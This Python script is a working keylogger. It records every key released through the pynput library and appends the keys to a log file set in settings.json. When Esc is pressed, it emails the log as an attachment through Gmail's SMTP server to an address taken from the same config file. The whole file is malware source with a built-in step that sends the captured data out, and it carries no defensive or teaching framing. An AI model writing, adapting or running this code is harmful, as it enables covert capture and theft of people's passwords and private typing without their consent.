from pynput import keyboard
import json
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def load_json():
    with open('settings.json', 'r') as file:
        data = json.load(file)
        return data

special_key_names = {getattr(keyboard.Key, attr) : f'<{attr.upper()}>'
for attr in dir(keyboard.Key) if not (attr.startswith('__') and attr.endswith('__'))}

###SETTINGS
data = load_json()
fileName =data.get('fileName')
path=data.get('path')
fromAddr = data.get('fromAddr')
toAddr = data.get('toAddr')
password = data.get('password')
subject = data.get('subject')
body = data.get('body')


def on_release(key):
   
    if key in special_key_names:
        key_name = special_key_names[key]
    else:
        try:
            key_name = key.char
        except AttributeError:
            key_name = str(key)
    
    # logging keys 
    write_file(key_name)
    
    if key == keyboard.Key.esc:
        return False 

def write_file(key):
    with open(f'{path}/{fileName}','a') as log:
        log.write(key) 




def send_mail(fromaddr,password,toaddr,filename,attachment):
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['subject'] = subject
    msg.attach(MIMEText(body,'plain'))

    attachment = open(attachment, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header(
        'Content-Disposition',
        f'attachment; filename={filename}',
    )
    msg.attach(part)
    attachment.close()

    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(fromaddr,password)
    text = msg.as_string()
    server.sendmail(fromaddr,toaddr,text)
    server.quit()


with keyboard.Listener(on_release=on_release) as listener:
    listener.join()

send_mail(fromAddr,password,toAddr,fileName,f'{path}/{fileName}')